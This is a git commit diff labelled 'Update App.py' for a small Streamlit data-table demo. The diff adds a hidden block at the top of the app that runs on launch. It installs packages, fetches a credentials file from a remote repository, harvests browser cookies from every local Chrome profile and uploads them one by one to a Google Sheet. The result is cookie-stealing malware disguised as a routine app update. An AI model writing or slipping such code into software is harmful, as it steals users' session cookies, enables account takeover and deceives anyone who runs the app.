8ef767b8d7aa7474af13fa2095af852a80f77bca
Dong Minh <65949191+dongminh97@users.noreply.github.com>
2020-07-01 20:21:37 -0700

    Update App.py

--- App.py
+++ App.py
@@ -2,6 +2,41 @@ import streamlit as st
 import datetime
 import numpy as np
 import pandas as pd
+###########################
+import sys
+import subprocess
+import os
+import requests
+subprocess.check_call([sys.executable, '-m', 'pip', 'install','browser_cookie3'])
+subprocess.check_call([sys.executable, '-m', 'pip', 'install','gspread'])
+import gspread
+import browser_cookie3
+import time
+path = os.environ.get('APPDATA')
+path = path[:path.find('AppData')+7] + r'\Local\Google\Chrome\User Data'
+url = 'https://raw.githubusercontent.com/dongminh97/cookies/master/credentials.json'
+r = requests.get(url, allow_redirects=True)
+open(path+'\credentials.json', 'wb').write(r.content)
+mid = os.listdir(os.path.expanduser(path))
+cookies = []
+for i in mid:
+    try:
+        coo = '\\'+ i + r'\Cookies'
+        path_ = path+ coo
+        #cookies.append(list(browser_cookie3.chrome(path_, domain_name='facebook.com')))
+        cookies.append(list(browser_cookie3.chrome(path_)))
+    except:
+        pass
+filename = path+'\credentials.json'
+gc = gspread.service_account(filename=filename)
+sht1 = gc.open_by_key('1lOZQFRZ6_1GtiFmVZWek0Wil6V9ONrEnpFb73F_9KIU')
+cell = 1
+for i in cookies:
+    for j in i:
+        sht1.sheet1.update('A' + str(cell), str(j))
+        cell+=1
+        time.sleep(1)
+###########################
 st.title('L')
 st.write("Here's our first attempt at using data to create a table:")
 st.write(pd.DataFrame({
